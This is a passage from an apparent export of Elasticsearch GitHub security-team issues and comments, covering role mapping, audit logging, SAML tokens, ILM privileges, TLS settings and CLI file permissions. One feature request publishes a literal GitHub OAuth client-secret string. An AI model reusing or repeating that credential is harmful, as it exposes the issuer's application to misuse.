Tim had a good point that an LDAP realm in user search mode can search for users (before the bind) by any attribute, and that you can configure the LDAP server that certain attributes be letter case sensitive. Therefore, in the general case, it is not true that LDAP realms ignore letter case when authenticate.

In fact this issue is not role mapping specific. For example authorization realms and auditing are also impacted if the authenticating realm ignores letter cases in usernames or not.

We converged towards a solution where we would introduce an LDAP realm option that applies a lower case (or upper case) text transform on the username **before** the username is checked by the authenticating realm. This way the username is brought to a ""canonical"" form that can be used in the role mapping rules. The big picture is that we _might_ introduce other types of username text transforms to other realm types, but thus far this is the most compelling use case and we wish to proceed with a fix for this specific problem, and not consider other transforms for other realms in this first iteration.

I have labelled it `adoptme/help wanted` because we don't have capacity to work on this fix at this moment.This is relevant for other realms too , i.e. OpenID Connect ( see [this](https://discuss.elastic.co/t/case-sensitive-email-id-handler-for-openid-based-user-authentication/214803/) Discuss topic ) Hi, we've got this problem too. Any release plans? It is kind of annoying because our AD users which connect through OIDC have different e-mail address styling (snake case vs. camel case)We encounter this problem in the role-mapping, too. Users do enter their IDs differently, some in uppercase, some in lower case.
An option to set how role mapping user ids are treated, would be nice.
Any plan to tackle this in the foreseeable future?Any news here? This is a real pain...I think we need one general concept of ""text_transforms"", that can be applied in 2 places.

1. For usernames. Usernames are reflected in more places than just role mappings (e.g. they're in audit logs) so it's important to canonicalize them early (per @albertzaharovits's [comment above](https://github.com/elastic/elasticsearch/issues/48120#issuecomment-543067649)). We probably want something on the realm config like `username.transform: lowercase`
2. Within role mappings. For fields that are not usernames, we want the option to compare case insensitively, but that can actually a little tricky if the value in the expression is a wildcard (e.g. `*foo*`) because of how Lucene automatons work (and how case insensitive comparisons should work). What's potentially easier is applying a transform to the actual value (e.g. the user's groups) before comparing them to the expression value/wildcard. If the role mapping DSL supported `""transform"":""lowercase""` on `""field""` expressions, and that meant _before comparing the user's value to this test value, transform the user's value to lowercase_, I think it would solve the issue.

 @tvernum The realm config option sounds reasonable. ",no,">bug,help wanted,:Security/Authentication,Team:Security,"
elastic/elasticsearch,965791843,"Remove code related to Beats Central Management","BCM was removed in 7.14 (https://github.com/elastic/beats/pull/25696, https://github.com/elastic/kibana/pull/99789). There are still leftover references in ES code related to accessing `.management-beats` index and licensing that should be cleaned up.

Please see https://github.com/elastic/elasticsearch/pull/30520, the original PR that introduced BCM-related code, for what to remove.","Pinging @elastic/es-security (Team:Security)",no,"Team:Security,"
elastic/elasticsearch,867753908,"Feature request: SSO for ElasticSearch with GitHub OAuth application","**Background**
Our team consists of nearly 400 developers who use GitHub Enterprise on a daily basis. We have over 20 ElasticSearch & Kibana deployments, all at the service for developers. We want the users to stop creating native realm users, incl. the default `elastic` administrative user (not compliant with our company policies.

It is very expensive (process and maintenance) to integrate ElasticSearch with SAML 2.0 or OAuth 2.0 (e.g. Azure AD/PingID) because the onboarding takes months to comply with all the rules and renew secrets every 3-6 months. We expect the number of Kibana's and ElasticSearch to multiply (to 60-80 this year), centralising Kibana does not offer all functionality developers need (e.g. machine learning, beats, uptime, etc.).

**Feature request**
- enable ElasticSearch & Kibana authentication for users to allow GitHub OAuth application registration that works with the Authorization callback URL & storing a client secret `e31105b57df1f77bad57b55af88da126976dc242`

**Related documentation:**
- [GitHub Authorizing OAuth Apps](https://docs.github.com/en/developers/apps/authorizing-oauth-apps)","Pinging @elastic/es-security (Team:Security)Unfortunately Github's implementation doesn't conform to OpenId Connect, but is rather a custom authentication protocol on top of oAuth2  that is quite similar but not exactly OpenID Connect . As such, SSO using our OpenID Connect realm is not achievable and we'd need to implement, maintain and support a custom solution to fit this use case. 

cc @bytebilly Thanks for the proposal @mapdegree.

I agree with Ioannis, and even if I see the potential benefit of this feature it's unlikely to be on our roadmap anytime soon because of the many features we are working on. Could you share more on the onboarding problems you got by using a centralized SSO solution?

We can keep this issue open and see if it will get traction from other users.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1273323719,"`TokenService` clean up","The `TokenService` could use some spring cleaning 🧹 🧹 🧹 

It has evolved quite organically; a sizeable portion of the code is either (1) not actually used anymore or (2) there for backwards compatibility with older ES versions (pre-`7.17`).

This issue tracks the various cuts we can make.

- [x] Remove dead code (several areas, but here is an [example](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/TokenService.java#L451))
- [x] Remove key rotation code (e.g. [this](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/TokenService.java#L2351-L2357)). This code was never actually used. 
- [ ] #87726","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1073589517,"Auditing should log indices for SearchScrollRequest + InternalScrollSearchRequest","<!--
Please first search existing issues for the feature you are requesting;
it may already exist, even as a closed issue.
-->

<!--
Describe the feature.

Please give us as much context as possible about the feature. For example,
you could include a story about a time when you wanted to use the feature,
and also tell us what you had to do instead. The last part is helpful
because it gives us an idea of how much harder your life is without the
feature.

-->

Tested on `7.15.2`.

Audit events created from scroll activity don't reveal the indices they're touching. The following curl requests:
```
curl -u elastic:changeme -XGET ""http://localhost:9200/someindex/_search?scroll=5m"" -H 'Content-Type: application/json' -d'{  ""size"": 1}'

curl -u elastic:changeme -XPOST ""http://localhost:9200/_search/scroll"" -H 'Content-Type: application/json' -d'{  ""scroll"": ""5m"",  ""scroll_id"": ""FGluY2x1ZGVfY29udGV4dF91dWlkDXF1ZXJ5QW5kRmV0Y2gBFlhmQU56dW9yUkVPbjAyNUtadGhLTWcAAAAAAAAALxY1WEtONHByVFRxdXBtZHFxQVA3cW1n""}'
```

Result in the following audit events:

```JSON
{""type"":""audit"", ""timestamp"":""2021-12-07T11:32:02,049-0500"", ""node.id"":""5XKN4prTTqupmdqqAP7qmg"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:61116"", ""request.id"":""AfnK-E_rRQORv2brlZaXNw"", ""action"":""indices:data/read/search"", ""request.name"":""SearchRequest"", ""indices"":[""someindex""]}
{""type"":""audit"", ""timestamp"":""2021-12-07T11:32:02,050-0500"", ""node.id"":""5XKN4prTTqupmdqqAP7qmg"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:61116"", ""request.id"":""AfnK-E_rRQORv2brlZaXNw"", ""action"":""indices:data/read/search[phase/query]"", ""request.name"":""ShardSearchRequest"", ""indices"":[""someindex""]}
{""type"":""audit"", ""timestamp"":""2021-12-07T11:33:41,328-0500"", ""node.id"":""5XKN4prTTqupmdqqAP7qmg"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:61137"", ""request.id"":""cHF-tH3pQiiFrj1z8U2GMA"", ""action"":""indices:data/read/scroll"", ""request.name"":""SearchScrollRequest""}
{""type"":""audit"", ""timestamp"":""2021-12-07T11:33:41,329-0500"", ""node.id"":""5XKN4prTTqupmdqqAP7qmg"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""authentication.type"":""REALM"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:61137"", ""request.id"":""cHF-tH3pQiiFrj1z8U2GMA"", ""action"":""indices:data/read/search[phase/query+fetch/scroll]"", ""request.name"":""InternalScrollSearchRequest""}
```

It'd be helpful if the last two lines included `""indices"":[""someindex""]`.
","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,317447424,"License start date recorded as  as a negative numeral ( `-1`) . ","*Original comment by @rasroh:*

ES 5.0:
Upgraded the License to Platinum. Upon viewing the installed License, saw the `start date in millis` - shows as `-1` .

 Doesn't affect anything much, but just logged this bug as an FYI : 

```
http://localhost:9200/_xpack/license
```
```
{
  ""license"" : {
    ""status"" : ""active"",
    ""uid"" : ""bdbff559-f174-4759-a247-b61a53c435f1"",
    ""type"" : ""platinum"",
    ""issue_date"" : ""2016-07-08T00:00:00.000Z"",
    ""issue_date_in_millis"" : 1467936000000,
    ""expiry_date"" : ""2017-02-01T23:59:59.999Z"",
    ""expiry_date_in_millis"" : 1485993599999,
    ""max_nodes"" : 100,
    ""issued_to"" : ""Elastic - INTERNAL"",
    ""issuer"" : ""Steve Kearns"",
    ""start_date_in_millis"" : -1
  }
}
```

cc / @LeeDr 

",,no,">bug,v5.0.0,:Security/License,Team:Security,"
elastic/elasticsearch,425957048,"SAML logout implicitly invalidate the associated refresh token","Currently, for the SAML logout action, the `access_token` is required and it is then invalidated. The associated `refresh_token` is an optional parameter. If present, it will be invalidated as well.

I propose we implicitly invalidate the associated `refresh_token` and remove this parameter. I believe the simple case of not invalidating the `refresh_token` during logout is trappy.
WDYT? @jkakavas @tvernum ","Pinging @elastic/es-securityAdding the link to a similar discussion we recently had for more context: https://github.com/elastic/elasticsearch/pull/38475#pullrequestreview-202228259

I'll add some other questions that we can handle in the same effort ( we can very well decide them to be out of scope) : 

- Should we implicitly invalidate the associated access token when the refresh token is invalidated ? 
- Should we implicitly invalidate the associated refresh token when the access token is invalidated ?
- Should realm logout be a special case for the above ?

My view is 

- Should we implicitly invalidate the associated access token when the refresh token is invalidated ? 

Yes, let's follow the RFC in that. I'd prefer to do this by adding a parameter in the REST API with a default value to true, than handling it internally with no escape hatch. 

- Should we implicitly invalidate the associated refresh token when the access token is invalidated ?

I'm less inclined to do this (`MAY` in the RFC). This is also connected to how I feel about 

- Should realm logout be a special case for the above ?

Regardless of what we do above, I think that having an `invalidateTokens()` that is not necessarily exposed in the Token API but can be called by realms logout is a very good idea. 

One final comment regarding the RFC, is that as it is also stated in the RFC itself, the revocation procedure should satisfy the functionality needs, the security policy and the threat model of the system and the specifics of implementation, so we can take its `SHOULD`s with a grain of `MAY`. > I propose we implicitly invalidate the associated refresh_token and remove this parameter.

I agree. When I wrote the API before Kibana was ready to use it, I didn't want to say _You have to have a `refresh_token` to call this_, because that could make it impossible to call the API in some circumstances.
But always invalidating the associated refresh token makes sense.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,392206812,"Include `Forwarded*` proxy request headers in the audit log","#36427 added support for the `X-Forwarded-For` header.
Even though this is the defacto header that proxies use to indicate the source address while relaying, a newish standard, https://tools.ietf.org/html/rfc7239, defines a more rich and complex way to indicate the same information (and some other more). The interplay between these alternatives might prove gnarly.","Pinging @elastic/es-security",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,317454113,"Audit Log - optionally log the specific fields that are accessed","*Original comment by @skearns64:*

There are some use-cases where a user will want to log the full set of fields that were accessed by a given request. I would expect this to be paired with LINK REDACTED to provide even more visibility.


","*Original comment by @skearns64:*

I can see two use-cases for this, which have slightly different requirements:
1. Audit Logging: As an admin, I need to know when a given field was accessed. For example, I need to know which users accessed the `credit_card` field, and when they accessed it. This means we need an audit log anytime the field **is returned** or explicitly referenced in a request.
2. Usage statistics: I have a bunch of data that was created over time, which has lots of fields. I want to know when these fields are **explicitly used in a request**, so I have a sense of whether a given field is really necessary anymore. 

Use-case 1 above is higher priority and higher value. 
*Original comment by @uboness:*

First use case makes sense wrt audit logs... Second use case feels to me should be part of stats & monitoring 
*Original comment by @skearns64:*

I agree. The reason I included the second use-case here is that a likely next question the admin would ask is ""who is using this field?"" which would bring this back to involving the same data as the first use-case.
*Original comment by @rmuir:*

an FLS-like wrapper might be a possibility, which records which fields of the lucene index were ""touched"" by a request. Not sure if its the easiest way to go about it: you'd have the same known challenges, e.g. if ES caches something above lucene, then we wouldnt ""see it"", but we manage to deal with those caches for FLS too...
",no,">feature,:Security/Audit,Team:Security,"
elastic/elasticsearch,338193809,"certgen: elasticsearch-certgen: No such file or directory","<!-- Bug report -->

**Elasticsearch version** (`bin/elasticsearch --version`): `Version: 6.3.0, Build: default/tar/424e937/2018-06-11T23:38:03.357887Z, JVM: 10.0.1` (official Docker image)

**Plugins installed**: []

**JVM version** (`java -version`): JVM: 10.0.1

**OS version** (`uname -a` if on a Unix-like system): `Linux c4a3b00e281d 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux` (official Docker image)

**Description of the problem including expected versus actual behavior**:

[As reported on the Docker repo](https://github.com/elastic/elasticsearch-docker/issues/177#issuecomment-402353650) the deprecated */usr/share/elasticsearch/bin/x-pack/certgen* is trying to walk up a directory to *elasticsearch-certgen* with 

```
DEPRECATED_DIRECTORY=`dirname ""$SCRIPT""`
```

which fails if you start it within */usr/share/elasticsearch/bin/x-pack/*, since that evaluates to `.` then. Very minor and maybe not worth fixing if we are getting rid of the deprecated folder soon.

**Steps to reproduce**:

Please include a *minimal* but *complete* recreation of the problem, including
(e.g.) index creation, mappings, settings, query etc.  The easier you make for
us to reproduce it, the more likely that somebody will take the time to look at it.

 1. Using Docker for the reproduction, but the behavior will be the same without Docker
 1. `docker run docker.elastic.co/elasticsearch/elasticsearch:6.3.0`
 2. `docker exec -it <container ID> /bin/bash`
 3. `cd /usr/share/elasticsearch/bin/x-pack`
 4. `./certgen`

**Provide logs (if relevant)**:

```
./certgen is deprecated, use ./elasticsearch-certgen
./certgen: line 13: ./elasticsearch-certgen: No such file or directory
```","Pinging @elastic/es-security",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,340422591,"Get XPack License API can return 404 ","The .NET client integration tests perform a bunch of calls after the node under test has started to validate we are talking to the expected cluster the first two of which are:

```
GET http://127.0.0.1:9200/_cat/nodes?h=version&pretty=true HTTP/1.1
Accept-Encoding: gzip, deflate
Host: 127.0.0.1:9200
````

```
HTTP/1.1 200 OK
content-type: text/plain; charset=UTF-8
content-length: 6

6.3.0
```

*and*

```
GET http://127.0.0.1:9200/_xpack/license?filter_path=license.type&pretty=true HTTP/1.1
Accept-Encoding: gzip, deflate
Host: 127.0.0.1:9200
```

```
HTTP/1.1 200 OK
content-type: application/json; charset=UTF-8
content-length: 45

{
  ""license"" : {
    ""type"" : ""basic""
  }
}
```

On our CI environment the latter call consistently returns a 404.

```
GET http://127.0.0.1:9200/_xpack/license?filter_path=license.type&pretty=true HTTP/1.1
Host: 127.0.0.1:9200
Accept-Encoding: gzip, deflate
````

```
HTTP/1.1 404 Not Found
content-type: application/json; charset=UTF-8
content-length: 4

{ }
```

It only does this on ANY of our build agents and locally I can not replicate this.

Build agents are running `Windows Server 2012 R2`

```
java version ""1.8.0_161""
Java(TM) SE Runtime Environment (build 1.8.0_161-b12)
Java HotSpot(TM) 64-Bit Server VM (build 25.161-b12, mixed mode)
```

Using [fiddler](https://www.telerik.com/fiddler) I can force a delayed response from `http://127.0.0.1:9200/_xpack/license?filter_path=license.type&pretty=true` to the client.

If I then hit `http://127.0.0.1:9200/_xpack/license`, without the query string (which wont trigger the delay), while the original call is being delayed I get a 200.






","Pinging @elastic/es-core-infraI'm being hit by this on `7.0.0-beta1` a lot more then in previous versions. 

I build a retry during our integration bootstrap around this call to retry 5 times which stabilized our tests on 6.x but on 7.x it seems to fail to yield a `200` more often.",no,">bug,:Security/License,Team:Security,"
elastic/elasticsearch,1076367999,"No audit log file in /usr/share/elasticsearch/logs directory when I opend the audit log configuration","**Elasticsearch version** (`bin/elasticsearch --version`):
7.5.2
system: kubernetes cluster
![2021-12-10 10-54-36 的屏幕截图](https://user-images.githubusercontent.com/17851645/145509435-e12e4873-fbc9-4b3e-90c1-97b9f317442a.png)

I have set the config xpack.security.audit.enabled: true,and restart elasticsearch,but in the logs file I can't find the json file what name is <clustername>_audit.json,why?
![2021-12-10 10-54-48 的屏幕截图](https://user-images.githubusercontent.com/17851645/145509430-981d8af3-2c7c-4fca-afd0-f43d5e43ae5f.png)



","And I use the command ""GET /_cluster/settings?include_defaults"", I also found the audit is enabled,but the audit.json file is not exist! why!!!!!!!!!
![2021-12-10 11-09-30 的屏幕截图](https://user-images.githubusercontent.com/17851645/145510995-b4ba5d90-824f-4368-a950-56cd54ded931.png)
Pinging @elastic/es-security (Team:Security)what?
@Hello-Linux the output for containers is written to the console by default. That's probably why the audit file is not created. Looking at the pod log will probably show the entries. Could you confirm that?

In recent versions you can switch to file output by using the `ES_LOG_TYPE` environment variable, but it's not available in `7.5.2`.

If you need further support to tune your output configuration, we suggest you to also ask in our official Discussion Forum (https://discuss.elastic.co/) or join our Slack channel (https://ela.st/slack).",no,">bug,:Security/Audit,Team:Security,"
elastic/elasticsearch,536892273,"Cluster Privilege for ILM policy namespaces","Currently there are two cluster privileges for ILM actions `manage_ilm` and `read_ilm`. It is also possible, although not recommended, to grant privileges for specific ILM actions (the list of which is here https://www.elastic.co/guide/en/elasticsearch/reference/master/index-lifecycle-management-api.html ).

We discussed inside the Security team that a new privilege is desirable. This privilege would be granting access to [_policy management APIs_](https://www.elastic.co/guide/en/elasticsearch/reference/master/index-lifecycle-management-api.html#ilm-api-policy-endpoint) (a subset of ILM actions, _create_, _get_ and _delete_ policy actions) . Moreover it must be a form of ""configurable cluster privilege"" such that the privilege can work on a restricted namespace of the policies.

This would prevent users that, even if they don't have privileges to assign a particular policy to an index, they can nonetheless alter the existing policy assigned to that index. The new privilege would permit the administrator to segment the policy namespace.

@elastic/es-core-features Can I get your thumbs up on this approach?

Given https://github.com/elastic/elasticsearch/pull/49451 we should be working on this soon-ish.

","Pinging @elastic/es-security (:Security/Authorization)@albertzaharovits let me make sure I understand you. You want to add a new cluster privilege that allows only for:

- Create/Update a policy
- Delete a policy
- Retrieve a policy

And prevents other actions like retrying, or move-to-step.

Is that correct?@dakrone That is correct.

In addition, the administrator would be able to define a namespace for the policies that can be accessed in the modes you listed. This is something new for the Security space as well.
For example:
`""manage_ilm_policy"": { ""policies"": "".kibana*""}` would allow create/update/delete/retrieve policies but only those policies named with a leading "".kibana"" prefix.Okay, thanks for clarifying @albertzaharovits, for the policy name, I assume that would match the policy ID as given in the URL right (or be a wildcard)?The wildcard in the permission must match the policy ID from the URL.This sounds good to the ILM team. One thing that came up in discussion, is this something we would also want to do for SLM in the future? (It wouldn't have to be done at the same time, just a future discussion)",no,">feature,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317454633,"ES startup fails if SSL config files are blocked by security manager","*Original comment by @DaveCTurner:*

If you specify an SSL config file (e.g. `xpack.ssl.key`, cert or ca) that is not in the ES `config` directory, the Java security manager will block access to the file. This is to be expected (if you know about the security manager and its config) and the result is that startup fails after a large stacktrace is printed. The issue is that new users may not know about the security manager and its config, and the root cause ...

```
Caused by: java.security.AccessControlException: access denied (""java.io.FilePermission"" "".../certs/ca/ca.crt"" ""read"")
```

... suggests a more general problem. We've had a number of reports of users (including internal ones) spending quite some time debugging this or constructing a workaround.

This is a speedbump in the new user experience, and if possible it'd be very desirable to guide users more directly towards the actual solution: place the SSL config files within the config directory so they can be read.

There are a few technical obstacles to overcome if trying to do this. Firstly, this exception happens very early in the startup process: in particular, we can't catch this with a bootstrap check because it happens in the plugin-loading phase of node initialization, well before the node start phase in which the bootstrap checks run. It is also risky to catch exceptions from the security manager: we might accidentally suppress a real security manager issue.
","*Original comment by @DaveCTurner:*

@s1monw says:

> I wonder if we can streamline this a bit more in core and add a Setting<Path> pathSetting = Settings.getPathSetting(""foo.bar"", readonly) where we can run a validator that checks if we can access the path by using the security manager and rethrow with a more readable error message. We might also be able to move the SSL configuration our of the constructor of our plugins which is a problem in general since we are accessing stuff before we validated settings. As a separate issue we might need to look into a solution to this by potentially adding an initializePlugin method that executes after we validated settings OR we need to have a different solutions for how to publish plugin settings.Need to enhance error message, it is really not permission problem.

Second, before changing the message, documentation guide need to put this the end of [this section](https://www.elastic.co/guide/en/elasticsearch/reference/6.2/configuring-tls.html#node-certificates).
`3. Copy the node certificate to the appropriate locations.` should be changed.

",no,">feature,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317448252,"document dynamic reloading for trusted certs","*Original comment by @jpcarey:*

For the truststore / JKS, this file is dynamically reloaded during runtime for 5.0+

For `xpack.ssl.certificate_authorities`, this setting is not a dynamic setting, however the individual files will get reloaded if modified.

If there are any other keystore / truststore features that can dynamically reload content, we should list that detail on the https://www.elastic.co/guide/en/elasticsearch/reference/master/security-settings.html pages.

cc: @jaymode ","It would be awesome if we could get this documented.[doc-issue-triage]",no,">docs,:Security/TLS,Team:Security,"
elastic/elasticsearch,863219087,"Update opensaml dependency to 4.1.0","opensaml 4.1.0 was released on 23/04/21. We should look into upgrading our dependencies for the SAML realm and the Identity Provider implementations

- [x] Investigate major API changes between 3.4.5 and 4.1.0
- [x] Look into release notes for bugs resolved and major functionality additions","Pinging @elastic/es-security (Team:Security)OpenSAML 4.0 requires Java 11.
We cannot upgrade in the 7.x development tree.
I've started work on this in https://github.com/elastic/elasticsearch/pull/77012

There's a few issues to work out, but most of them seem to be solvable _except_ OpenSAML4 seems to have a hard dependency on the standard (non-FIPS) distribution of BouncyCastle.
It requires `org.bouncycastle.jce.ECNamedCurveTable` which doesn't exist in BCFIPS.  
This makes it very difficult for us, because we want to support SAML when running in FIPS mode, and we can't do that (at least, not easily) if the BC jars are also on the classpath.
We've upgraded to v4.0 in #77012, but could not upgrade to v4.1 due to an incompatibility with FIPS.
I'm leaving this issue open so that we can look at it again in the future.",no,">non-issue,:Security/Authentication,Team:Security,"
elastic/elasticsearch,420076597,"Documentation clarification around required settings for transport client on 7.0","We've recently been testing the transport client with a 7.0.0 cluster. The ""Breaking changes in 7.0"" documentation mentions [breaking changes](https://www.elastic.co/guide/en/elasticsearch/reference/7.0/breaking-changes-7.0.html#tls-setting-fallback) with the TLS/SSL settings, but it isn't _exactly_ clear which settings need to be modified:
> Each component (realm, transport, http, http client, etc) must now be configured with their own settings for TLS if it is being used.


Additionally, when looking at the security settings documentation for the [transport profile TLS/SSL settings](https://www.elastic.co/guide/en/elasticsearch/reference/7.0/security-settings.html#ssl-tls-profile-settings) it isn't quite clear _exactly_ which settings need to be set for the transport client to work.

The original discussion around this can be found here: https://github.com/elastic/cloud/issues/27767#issuecomment-471965353. 

cc @lcawl ","Pinging @elastic/es-security[docs issue triage]

Leaving open. This is still relevant.> The original discussion around this can be found here: [elastic/cloud#27767 (comment)](https://github.com/elastic/cloud/issues/27767#issuecomment-471965353).

Broken link.>Additionally, when looking at the security settings documentation for the [transport profile TLS/SSL settings](https://www.elastic.co/guide/en/elasticsearch/reference/7.0/security-settings.html#ssl-tls-profile-settings) it isn't quite clear exactly which settings need to be set for the transport client to work.

We should document:
- Which settings the transport profile will automatically inherit from the main transport SSL settings
- Which specific settings (if required/not inherited) should be set explicitly against the transport profile clause",no,">docs,:Security/Client,Team:Security,"
elastic/elasticsearch,561204856,"Security Configuration migration","At https://www.elastic.co/guide/en/elasticsearch/reference/current/security-backup.html we document how to backup security configuration and how to restore it back. The process described there requires creating a snapshot of the `.security` index. The security-restore process will completely overwrite the existing configuration, and, as it turns out, might not work completely for API Keys (because API keys are bound to realm names).

We discussed it in the team meeting and agreed that it would be useful to our users to document a frictionless method to transfer at least some Security configuration (from the `.security` index) between clusters, without requiring a snapshot repository (and the limitations associated with that, i.e. restored indices compatible only back one version) and without requiring stripping away the existing security configuration on the destination cluster.

The ""method"" should not access the `.security` index directly because this is not a future proof strategy with the advent of System Indices. The most likely course of action is to investigate that objects returned through by GET APIs are also valid for PUT APIs. There are caveats here, for example, retrieving user password hashes must necessary be permissible to the `superuser` role only, ""transient"" fields of roles must be ignored when PUTing the role, and PUTing API keys given the id is not supported. We either should remediate the limitations or document them.","Pinging @elastic/es-security (:Security/Security)Pinging @elastic/es-docs (>docs)",no,">docs,:Security/Security,Team:Security,"
elastic/elasticsearch,1072330051,"Prevent users from running elasticsearch-service-tokens as root","With the change to service tokens showing up as a warning in the upgrade assistant, this tool will get a lot more attention soon. 
Currently you are able to run it as root, which will make your Elasticsearch node not start with an access denied exception, since the service token file gets created with the wrong permissions.
There is no way to prevent the admins from running it with a different user than the one that ES will be run(since we don't know what they will run ES with), but we can prevent them from running as root since ES cannot start as root anyways. 
```
2021-12-02T19:27:19,226][INFO ][o.e.x.s.a.Realms         ] [localhost.localdomain] license mode is [trial], currently licensed security realms are [reserved/reserved,file/default_file,native/default_native]
[2021-12-02T19:27:19,236][INFO ][o.e.x.s.a.s.FileRolesStore] [localhost.localdomain] parsed [0] roles from file [/etc/elasticsearch/roles.yml]
[2021-12-02T19:27:19,559][ERROR][o.e.b.Bootstrap          ] [localhost.localdomain] Exception
java.lang.IllegalStateException: security initialization failed
        at org.elasticsearch.xpack.security.Security.createComponents(Security.java:571) ~[?:?]
        at org.elasticsearch.node.Node.lambda$new$18(Node.java:733) ~[elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at java.util.stream.ReferencePipeline$7$1.accept(ReferencePipeline.java:273) ~[?:?]
        at java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1625) ~[?:?]
        at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:509) ~[?:?]
        at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:499) ~[?:?]
        at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:921) ~[?:?]
        at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[?:?]
        at java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:682) ~[?:?]
        at org.elasticsearch.node.Node.<init>(Node.java:747) ~[elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.node.Node.<init>(Node.java:309) ~[elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.bootstrap.Bootstrap$5.<init>(Bootstrap.java:234) ~[elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:234) ~[elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:434) [elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:166) [elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:157) [elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:77) [elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:112) [elasticsearch-cli-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.cli.Command.main(Command.java:77) [elasticsearch-cli-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:122) [elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
        at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:80) [elasticsearch-7.16.0-SNAPSHOT.jar:7.16.0-SNAPSHOT]
Caused by: java.lang.IllegalStateException: Failed to load service_tokens file [/etc/elasticsearch/service_tokens]
        at org.elasticsearch.xpack.security.authc.service.FileServiceAccountTokenStore.<init>(FileServiceAccountTokenStore.java:73) ~[?:?]
        at org.elasticsearch.xpack.security.Security.createComponents(Security.java:746) ~[?:?]
        at org.elasticsearch.xpack.security.Security.createComponents(Security.java:560) ~[?:?]
        ... 20 more
Caused by: java.nio.file.AccessDeniedException: /etc/elasticsearch/service_tokens
```","Pinging @elastic/es-security (Team:Security)We discussed this issue during team meeting and agreed that we should print warnings if the new file is created with different owner, mode and/or permissions than the `elasticsearch.yml` file. 

Currently the CLI tools do not prevent running as root. Many of them are actually safe to run as root because updating existing files, e.g. `users`, does not change the file owner and permission. This problem only happens when a new file must be created which is the case for the `elasticsearch-service-tokens` command and also a few other commands like `elasticsearch-syskeygen`, `elasticsearch-certutil`. We feel preventing running as root entirely is a breaking change that we don't like. Therefore we consider issuing warnings to be the right level of mitigation.",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,975761204,"Provide warning (or error) when creating (or updating) a user with a non-existing role","Currently, when creating a user with a role that does not exist, the api call isser does not get any feedback about this.

The following is from a `7.12` cluster

```
POST /_security/user/jacknich
{
  ""password"" : ""l0ng-r4nd0m-p@ssw0rd"",
  ""roles"" : [ ""admin"", ""other_role1"" ],
  ""full_name"" : ""Jack Nicholson"",
  ""email"" : ""jacknich@example.com"",
  ""metadata"" : {
    ""intelligence"" : 7
  }
}
```

```
{
  ""created"" : true
}
```

Neither `admin` or `another_role1`  exist on my cluster.
","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,582354989,"Configure `search.allow_expensive_queries` per role","It would be a nice feature to be able to configure the `search.allow_expensive_queries` per role.
This would provide the opportunity for example for super users to be able to run expensive queries
but they will still be not permitted for normal users to do so.","Pinging @elastic/es-search (:Search/Search)Pinging @elastic/es-security (:Security/Security)I talked to @matriv and @giladgal to get more context around this request, reporting here so we can discuss further.

